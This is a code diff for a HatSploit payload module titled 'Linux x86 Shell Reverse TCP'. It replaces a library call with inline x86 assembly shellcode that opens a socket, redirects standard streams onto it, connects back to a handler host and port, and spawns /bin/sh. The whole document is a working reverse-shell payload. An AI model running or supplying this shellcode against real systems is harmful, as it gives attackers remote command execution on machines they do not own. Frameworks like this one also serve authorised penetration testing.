@@ -6,10 +6,11 @@
 #
 
 from hatsploit.lib.payload import Payload
-from hatloads import HatLoads
+from pex.assembler import Assembler
+from pex.socket import Socket
 
 
-class HatSploitPayload(Payload, HatLoads):
+class HatSploitPayload(Payload, Assembler, Socket):
     details = {
         'Name': "Linux x86 Shell Reverse TCP",
         'Payload': "linux/x86/shell_reverse_tcp",
@@ -22,9 +23,51 @@ class HatSploitPayload(Payload, HatLoads):
     }
 
     def run(self):
-        return self.get_payload(
-            self.details['Platform'],
+        rhost = self.pack_host(self.handler['RHOST'])
+        rport = self.pack_port(self.handler['RPORT'])
+
+        return self.assemble(
             self.details['Architecture'],
-            f"shell_{self.details['Type']}",
-            self.handler,
+            f"""
+            start:
+                xor ebx, ebx
+                mul ebx
+                push ebx
+                inc ebx
+                push ebx
+                push byte +0x2
+                mov ecx, esp
+                mov al, 0x66
+                int 0x80
+
+                xchg eax, ebx
+                pop ecx
+
+            dup:
+                mov al, 0x3f
+                int 0x80
+
+                dec ecx
+                jns dup
+                push 0x{rhost.hex()}
+                push 0x{rport.hex()}0002
+                mov ecx, esp
+                mov al, 0x66
+                push eax
+                push ecx
+                push ebx
+                mov bl, 0x3
+                mov ecx, esp
+                int 0x80
+
+                push edx
+                push 0x68732f2f
+                push 0x6e69622f
+                mov ebx, esp
+                push edx
+                push ebx
+                mov ecx, esp
+                mov al, 0xb
+                int 0x80
+            """
         )
